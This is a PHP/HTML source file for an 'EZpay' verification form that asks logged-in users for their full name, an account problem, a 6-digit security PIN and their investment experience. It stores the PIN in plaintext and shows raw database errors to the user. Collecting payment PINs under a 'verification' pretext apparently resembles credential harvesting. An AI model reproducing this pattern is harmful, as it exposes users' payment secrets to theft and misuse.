<?php
session_start();
require_once 'db_connect.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$error = '';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $full_name = trim($_POST['full_name']);
    $problem = $_POST['problem'];
    $pin = trim($_POST['pin']);
    $experience = $_POST['experience'];
    $user_id = $_SESSION['user_id'];

    if (empty($full_name) || empty($pin)) {
        $error = "Please fill in all fields.";
    } elseif (strlen($pin) != 6 || !ctype_digit($pin)) {
        $error = "Security PIN must be 6 digits.";
    } else {
        $stmt = $pdo->prepare("INSERT INTO verification (user_id, full_name, problem, security_pin, experience_level) VALUES (?, ?, ?, ?, ?)");
        try {
            $stmt->execute([$user_id, $full_name, $problem, $pin, $experience]);
            header("Location: thankyou.php");
            exit;
        } catch (PDOException $e) {
            $error = "Error submitting verification: " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EZpay - Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="header-gradient">
        <h1>Welcome to E-Zpay</h1>
        <p>Please complete your verification</p>
    </div>

    <div class="container" style="margin-top: -20px;">
        <div class="card">
            <?php if ($error): ?>
                <div style="color: red; text-align: center; margin-bottom: 15px;">
                    <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>

            <form method="POST" action="">
                <div class="form-group">
                    <label class="form-label">Full Name</label>
                    <input type="text" name="full_name" class="form-control" placeholder="Enter full name" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Problem</label>
                    <div class="input-group">
                        <select name="problem" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select issue</option>
                            <option value="Id auto Logout">Id auto Logout</option>
                            <option value="Slow sell">Slow sell</option>
                            <option value="Quote not added">Quote not added</option>
                            <option value="Tool auto deauthorized">Tool auto deauthorized</option>
                        </select>
                        <span style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">▼</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Security PIN (6 Digits)</label>
                    <div class="input-group">
                        <input type="password" name="pin" id="pin" class="form-control" placeholder="Enter 6-digit PIN" required pattern="[0-9]{6}" maxlength="6">
                        <span class="toggle-password" onclick="togglePassword('pin')">👁️</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Investment Experience</label>
                    <div class="input-group">
                        <select name="experience" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select experience</option>
                            <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
                            <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
                            <option value="Experienced (3-5 years)">Experienced (3-5 years)</option>
                            <option value="Expert (5+ years)">Expert (5+ years)</option>
                        </select>
                        <span style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">▼</span>
                    </div>
                </div>

                <button type="submit" class="btn btn-primary">SUBMIT VERIFICATION</button>
            </form>
        </div>
    </div>

    <script>
        function togglePassword(id) {
            const input = document.getElementById(id);
            if (input.type === "password") {
                input.type = "text";
            } else {
                input.type = "password";
            }
        }
    </script>
</body>
</html>
